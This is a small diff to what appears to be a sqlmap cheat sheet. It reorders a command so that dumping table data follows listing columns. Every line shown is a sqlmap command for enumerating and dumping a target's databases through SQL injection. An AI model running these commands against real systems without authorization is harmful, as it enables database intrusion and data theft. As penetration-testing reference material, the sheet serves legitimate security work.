@@ -9,11 +9,11 @@ sqlmap --dbms=mysql -u "$URL" --dbs
 # Enumerate tables
 sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables
 
-# Dump table data
-sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump
-
 # List columns of table target_Table of database target_DB
 sqlmap -u “http://target_server/” -D target_DB -T target_Table --columns
+
+# Dump table data
+sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump
 
 # Specify target DBMS to MySQL
 sqlmap -u "$URL" --dbms=mysql
